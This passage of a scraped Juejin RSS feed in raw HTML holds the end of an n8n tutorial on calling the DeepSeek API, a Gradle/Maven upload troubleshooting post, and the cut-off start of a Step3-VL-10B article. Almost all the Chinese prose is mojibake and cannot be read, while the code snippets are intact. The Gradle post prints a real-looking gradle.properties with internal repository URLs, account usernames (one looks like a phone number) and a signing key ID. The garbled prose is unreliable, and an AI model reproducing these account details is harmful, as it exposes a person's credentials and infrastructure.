<li><code>Authorization</code> ï¼šéå¿…å¡«ï¼è¿™é¡¹éœ€è¦å¡«å†™ä½ åœ¨ DeepSeek å®˜ç½‘ç”³è¯·çš„ keyï¼Œå€¼æ˜¯ <code>Bearer + ç©ºæ ¼ + ä½ çš„key</code></li>
</ul>
<p>å¦‚æœä½ æŒ‰ç…§<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FDAPeojmssNQSyATkwGahIg" target="_blank" title="https://mp.weixin.qq.com/s/DAPeojmssNQSyATkwGahIg" ref="nofollow noopener noreferrer">ã€Šã€n8nã€æ¥å…¥æœ¬åœ°éƒ¨ç½²çš„ DeepSeekã€‹</a>é…ç½®äº†ä¸€ä¸ª DeepSeek å‡­è¯ï¼Œé‚£<code>Authorization</code> è¿™é¡¹å¯ä»¥ä¸å¡«ã€‚</p>
<ul>
<li>ç›´æ¥åœ¨ <code>Authentication</code> è¿™é¡¹é€‰æ‹© <code>Predefined Credential Type</code>ã€‚</li>
<li><code>Credential Type</code> é€‰æ‹© <code>DeepSeek</code>ã€‚</li>
<li><code>DeepSeek</code> é€‰æ‹©ä½ åˆ›å»ºçš„ DeepSeek å‡­è¯ï¼Œæˆ‘è¿™é‡Œçš„å‡­è¯åå«â€œDeepSeek accountâ€ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/961022c76e6040ca82461e89619d8f3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=3G9RGC1kItZmg5503h16T%2FZPOPE%3D" alt="08.png" loading="lazy"/></p>
<p>å›åˆ° HTTP Request èŠ‚ç‚¹é…ç½®é¢æ¿ï¼Œå¼€å¯â€œSend Headersâ€è¿™é¡¹ã€‚</p>
<p><code>Specify Headers</code> é¡¹é€‰æ‹© <code>Using Fields Below</code>ã€‚</p>
<p>ç„¶åå¡«å…¥ä»¥ä¸‹å†…å®¹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fc30cc441184b5fa47660e42da47312~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=1v1GEuzzPdD6UT2E58zCQOy010A%3D" alt="09.png" loading="lazy"/></p>
<p>å¦‚æœä½ æ²¡æŒ‰ç…§<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FDAPeojmssNQSyATkwGahIg" target="_blank" title="https://mp.weixin.qq.com/s/DAPeojmssNQSyATkwGahIg" ref="nofollow noopener noreferrer">ã€Šã€n8nã€æ¥å…¥æœ¬åœ°éƒ¨ç½²çš„ DeepSeekã€‹</a>é‡Œåˆ›å»º DeepSeek å‡­è¯ï¼Œå°±éœ€è¦ç‚¹å‡» <code>Send Headers</code> é‡Œçš„ <code>Add Parameter</code> æŒ‰é’®åˆ›å»ºå¤šä¸€é¡¹ï¼Œæ‰‹åŠ¨å¡«å…¥ <code>Authentication</code> å’Œå¯¹åº”çš„ keyã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ad6a623c21c4b5b8da2857c860e79ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=6HeP4OYIOQFx%2BQyJ9Ip7Y4bV7D0%3D" alt="10.png" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å†çœ‹çœ‹ DeepSeek å®˜æ–¹ç¤ºä¾‹è¿˜æœ‰å“ªäº›ä¿¡æ¯éœ€è¦ä¼ è¾“çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7b854d657874b1bbaf55a49dede53d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=HakP7HDGXhMOkRtKjFv8yi7Kpns%3D" alt="11.png" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿˜æœ‰ä¸€é¡¹ <code>-d</code> å¼€å¤´çš„æ•°æ®ã€‚</p>
<p>è¿™æ®µä»£ç é‡Œæœ‰ä¸€ä¸ª <code>JSON</code> ç»“æ„çš„æ•°æ®ã€‚çœ‹è‹±æ–‡å•è¯åº”è¯¥å°±èƒ½çŒœåˆ°å¤§æ¦‚çš„æ„æ€äº†ã€‚<code>role</code> æ˜¯è§’è‰²çš„æ„æ€ï¼Œ<code>content</code> æ˜¯å†…å®¹åˆ°æ„æ€ã€‚</p>
<p><code>{"role": "user", "content": "Hello!"}</code> å°±æ˜¯ç”¨æˆ·è¿™ä¸ªè§’è‰²å‘é€äº†ä¸€æ®µâ€œHello!â€ çš„å†…å®¹ã€‚</p>
<p>ä½†ç°åœ¨è¿™ä¸ªâ€œHello!â€æ˜¯å†™æ­»çš„ï¼Œä¸èƒ½æ”¹çš„ã€‚è¿™ä¸ç¬¦åˆæˆ‘ä»¬å’Œ DeepSeek èŠå¤©çš„è¦æ±‚ï¼Œå› ä¸ºå†™æ­»çš„æ•°æ®ï¼Œæˆ‘ä»¬æ¯æ¬¡å‘é€ä¿¡æ¯ DeepSeek åªä¼šæ¥æ”¶åˆ°â€œHello!â€ã€‚</p>
<p>åœ¨ n8n å¯ä»¥è¿™ä¹ˆåšã€‚</p>
<p>é¦–å…ˆå¼€å¯â€œSend Bodyâ€ï¼Œè¿™é¡¹çš„æ„æ€æ˜¯å¯ä»¥å°†æ•°æ®é€šè¿‡ Body ä¼ ç»™ DeepSeek çš„æœåŠ¡å™¨ã€‚</p>
<p><code>Body Content Type</code> é€‰æ‹© <code>JSON</code>ã€‚</p>
<p><code>Specify Body</code> é€‰æ‹© <code>Using JSON</code>ã€‚</p>
<p>ç„¶åæŠŠ DeepSeek å®˜æ–¹ç¤ºä¾‹çš„é‚£æ®µä»£ç å¤åˆ¶è¿‡æ¥ï¼ŒæŠŠâ€œHello!â€è¿™å‡ ä¸ªå­—åˆ æ‰ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d661f91ba7eb46e5afc6d811bc6115ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=R1jOGBTYXrUcuIXJ%2BX%2Bcw6Ifh1M%3D" alt="12.png" loading="lazy"/></p>
<p>æœ€åå°†ä¸Šä¸€ä¸ªèŠ‚ç‚¹ä¼ è¿‡æ¥ <code>chatinput</code> æ‹–æ‹½è¿›æ¥ã€‚</p>
<p>å¦‚æœä½ æ˜¯æŒ‰ç…§æœ¬æ–‡çš„æ“ä½œä¸€æ­¥æ­¥åšçš„è¯ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥å°†è¿™æ®µä»£ç ç›´æ¥å¤åˆ¶è¿›å»ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">{
  <span class="hljs-string">"model"</span>: <span class="hljs-string">"deepseek-chat"</span>,
  <span class="hljs-string">"messages"</span>: [
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"You are a helpful assistant."</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"{{ <span class="hljs-variable">$json</span>.chatInput }}"</span>}
  ],
  <span class="hljs-string">"stream"</span>: <span class="hljs-literal">false</span>
}
</code></pre>
<h3 data-id="heading-4">å‘èµ· HTTP è¯·æ±‚</h3>
<p>å®Œæˆä¸Šé¢çš„é…ç½®åï¼Œå›åˆ°å·¥ä½œæµç”»æ¿ï¼Œç‚¹å‡»é¡µé¢ä¸‹æ–¹çš„æ©™è‰²æŒ‰é’®ï¼ˆOpen chatï¼‰å”¤èµ·èŠå¤©é¢æ¿ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9d0d83bd9674ccea492a5f7502a9def~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=6IT%2FGtDdVN6%2BMfeH7Dv%2BEQGR3Y0%3D" alt="13.png" loading="lazy"/></p>
<p>ä½ ä¹Ÿå¯ä»¥åœ¨ä¸‹æ–¹å¼¹å‡ºçš„æ§åˆ¶å°å³ä¾§çš„èŠ‚ç‚¹è¾“å‡ºé¢æ¿é‡Œè°ƒæ•´è¾“å‡ºæ•°æ®çš„å±•ç¤ºæ ¼å¼ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/025f3ed302d04264adf61bb55581d034~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769653324&amp;x-signature=ehhtUQfPinwKpAbEfm7AKtYDpcg%3D" alt="14.png" loading="lazy"/></p>
<hr/>
<p>ä»¥ä¸Šå°±æ˜¯æœ¬æ–‡çš„å…¨éƒ¨å†…å®¹å•¦ï¼Œé€šè¿‡æœ¬æ–‡çš„è®²è§£ï¼Œä½ åº”è¯¥å·²ç» n8n ä¸­ HTTP èŠ‚ç‚¹åº”è¯¥æ€ä¹ˆä½¿ç”¨äº†ã€‚</p>
<p>æƒ³äº†è§£æ›´å¤šn8nç©æ³•æ¬¢è¿å…³æ³¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fappmsgalbum%3F__biz%3DMzAwMjU3ODU5Ng%3D%3D%26action%3Dgetalbum%26album_id%3D4337364695070801925%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzAwMjU3ODU5Ng==&amp;action=getalbum&amp;album_id=4337364695070801925#wechat_redirect" ref="nofollow noopener noreferrer">ã€Šn8nä¿®ç‚¼æ‰‹å†Œã€‹</a>ğŸ‘</p>
<p>å¦‚æœä½ æœ‰ NASï¼Œæˆ‘éå¸¸å»ºè®®ä½ åœ¨ NAS ä¸Šéƒ¨ç½²ä¸€å¥— n8nï¼Œææå‰¯ä¸šä¹Ÿå¥½ï¼Œå¸®ä½ å®Œæˆå·¥ä½œä»»åŠ¡ä¹Ÿå¥½  <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FppIWKP8StiFn2k2IW0ZpNQ" target="_blank" title="https://mp.weixin.qq.com/s/ppIWKP8StiFn2k2IW0ZpNQ" ref="nofollow noopener noreferrer">ã€Šã€NASã€ä¸æ­¢å¨±ä¹ï¼ŒNASä¹Ÿæ˜¯ç”Ÿäº§åŠ›ï¼Œåœ¨ç»¿è”éƒ¨ç½²AIå·¥ä½œæµå·¥å…·-n8nã€‹</a></p>
<p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[gradle ä¸Šä¼ mavenåº“ï¼Œé‡åˆ°mavenåº“åœ°å€æœªåŠæ—¶æ›´æ–°çš„é—®é¢˜]]></title>    <link>https://juejin.cn/post/7597746390435315748</link>    <guid>https://juejin.cn/post/7597746390435315748</guid>    <pubDate>2026-01-22T03:22:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597746390435315748" data-draft-id="7597736491469897782" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="gradle ä¸Šä¼ mavenåº“ï¼Œé‡åˆ°mavenåº“åœ°å€æœªåŠæ—¶æ›´æ–°çš„é—®é¢˜"/> <meta itemprop="keywords" content="APP"/> <meta itemprop="datePublished" content="2026-01-22T03:22:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="longevity"/> <meta itemprop="url" content="https://juejin.cn/user/2436173499477607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            gradle ä¸Šä¼ mavenåº“ï¼Œé‡åˆ°mavenåº“åœ°å€æœªåŠæ—¶æ›´æ–°çš„é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173499477607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    longevity
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T03:22:38.000Z" title="Thu Jan 22 2026 03:22:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">é—®é¢˜æè¿°ï¼š</h4>
<p>é—®é¢˜æŠ¥é”™ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">Could <span class="hljs-built_in">not</span> publish configuration <span class="hljs-comment">'archives' &gt; Failed to deploy artifacts: Could not transfer </span>
artifact com.dnake.medical:baseCoreModule:aar:<span class="hljs-number">1.0</span>.<span class="hljs-number">60</span>-alpha <span class="hljs-keyword">from</span>/<span class="hljs-keyword">to</span> remote 
(&lt;http://<span class="hljs-number">192.168</span>.<span class="hljs-number">14.234</span>:<span class="hljs-number">8081</span>/nexus/content/repositories/android-alpha/&gt;):
Connection timed out: connect
</code></pre>
<p>åœ¨moduleçš„build.gradleæ–‡ä»¶ä¸­ï¼Œä½¿ç”¨gradl.propertiesé…ç½®mavenåº“åœ°å€ï¼Œåœ¨æ‰§è¡Œä¸Šä¼ æ—¶ï¼Œgradle.propertiesä¸­å·²ç»æ˜¯æœ€æ–°çš„mavenåœ°å€ï¼Œä½†ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼Œä»ä½¿ç”¨æ—§çš„mavenåœ°å€ï¼Œå¯¼è‡´æ— æ³•ä¸Šä¼ æˆåŠŸï¼›é—®é¢˜æ–‡ä»¶å¦‚ä¸‹ï¼š<br/></p>
<p><strong>uploadArchives.gradle</strong> æ–‡ä»¶</p>
<pre><code class="hljs language-gradle" lang="gradle">repository(url: ALPHA_REPOSITORY_URL) {

    authentication(userName: NEXUS_USERNAME, password: NEXUS_PASSWORD)

    pom.project {
        version publishAlphaVersion
        groupId publishGroup
        artifactId publishGroupId
        packaging publishType
        description publishDescription
    }
</code></pre>
<p><strong>gradle.properties</strong>æ–‡ä»¶</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-variable constant_">ALPHA_REPOSITORY_URL</span>=<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.96.234:8081/nexus</span><span class="hljs-regexp">/content/repositories</span><span class="hljs-regexp">/android-alpha/</span>
</code></pre>
<p>è¿™é‡Œçš„<strong>ALPHA_REPOSITORY_URL</strong>å·²ç»æ˜¯æœ€æ–°çš„åœ°å€ï¼›é—®é¢˜å°±å‡ºåœ¨è¿™ä¸ª<strong>ALPHA_REPOSITORY_URL</strong>å˜é‡ä¸Šé¢ï¼Œgradleå°†å…¶ç¼“å­˜åˆ°äº†å…¨å±€ï¼Œæ‰€ä»¥ä¸Šä¼ çš„æ—¶å€™ï¼Œä½¿ç”¨çš„ä»æ˜¯æ—§çš„</p>
<h4 data-id="heading-1">è§£å†³åŠæ³•</h4>
<p>æ£€æŸ¥ <code>C:\Users\ä½ çš„ç”¨æˆ·å\.gradle\gradle.properties</code> è¿™ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢çš„<strong>ALPHA_REPOSITORY_URL</strong>å˜é‡ä»ä¸ºæ—§åœ°å€ï¼›ä»¥ä¸‹æ˜¯å…¶ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">XQXC_SNAPSHOT_REPOSITORY_URL</span>=http\://nexus.xingqiuxiuchang.cn\:<span class="hljs-number">12019</span>/repository/maven-snapshots/
<span class="hljs-attr">CENTRAL_RELEASE_REPOSITORY_URL</span>=https\://s01.oss.sonatype.org/content/repositories/releases/
<span class="hljs-attr">ALPHA_REPOSITORY_URL</span>=http\://<span class="hljs-number">192.168</span>.<span class="hljs-number">14.234</span>\:<span class="hljs-number">8081</span>/nexus/content/repositories/android-alpha/
<span class="hljs-attr">org.gradle.parallel</span>=<span class="hljs-literal">true</span>
<span class="hljs-attr">signing.secretKeyRingFile</span>=D\:/secring.gpg
<span class="hljs-attr">android.injected.testOnly</span>=<span class="hljs-literal">false</span>
<span class="hljs-attr">XQXC_RELEASE_REPOSITORY_URL</span>=http\://nexus.xingqiuxiuchang.cn\:<span class="hljs-number">12019</span>/repository/maven-releases/
<span class="hljs-attr">CENTRAL_NEXUS_USERNAME</span>=<span class="hljs-number">13132777478</span>
<span class="hljs-attr">XQXC_NEXUS_USERNAME</span>=admin
<span class="hljs-attr">systemProp.https.proxyPort</span>=<span class="hljs-number">80</span>
<span class="hljs-attr">NEXUS_USERNAME</span>=admin
<span class="hljs-attr">YUNXIAO_NEXUS_USERNAME</span>=QMUkAJ
<span class="hljs-attr">YUNXIAO_SNAPSHOT_REPOSITORY_URL</span>=https\://packages.aliyun.com/maven/repository/<span class="hljs-number">2004615</span>-snapshot-<span class="hljs-number">8</span>I3s7X/
<span class="hljs-attr">signing.keyId</span>=<span class="hljs-number">954038</span>C8
<span class="hljs-attr">RELEASE_REPOSITORY_URL</span>=http\://<span class="hljs-number">192.168</span>.<span class="hljs-number">14.234</span>\:<span class="hljs-number">8081</span>/nexus/content/repositories/android/
<span class="hljs-attr">systemProp.http.proxyPort</span>=<span class="hljs-number">80</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜¶è·ƒæ˜Ÿè¾°Step3-VL-10Bï¼š10Bå‚æ•°å¤šæ¨¡æ€æ¨¡å‹çš„è½»é‡åŒ–çªç ´ä¹‹é“]]></title>    <link>https://juejin.cn/post/7597725815917330473</link>    <guid>https://juejin.cn/post/7597725815917330473</guid>    <pubDate>2026-01-22T01:02:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597725815917330473" data-draft-id="7597699032213536822" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜¶è·ƒæ˜Ÿè¾°Step3-VL-10Bï¼š10Bå‚æ•°å¤šæ¨¡æ€æ¨¡å‹çš„è½»é‡åŒ–çªç ´ä¹‹é“"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-22T01:02:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å›´ç‚‰èŠç§‘æŠ€"/> <meta itemprop="url" content="https://juejin.cn/user/3229679898597516"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜¶è·ƒæ˜Ÿè¾°Step3-VL-10Bï¼š10Bå‚æ•°å¤šæ¨¡æ€æ¨¡å‹çš„è½»é‡åŒ–çªç ´ä¹‹é“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3229679898597516/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å›´ç‚‰èŠç§‘æŠ€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T01:02:32.000Z" title="Thu Jan 22 2026 01:02:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body 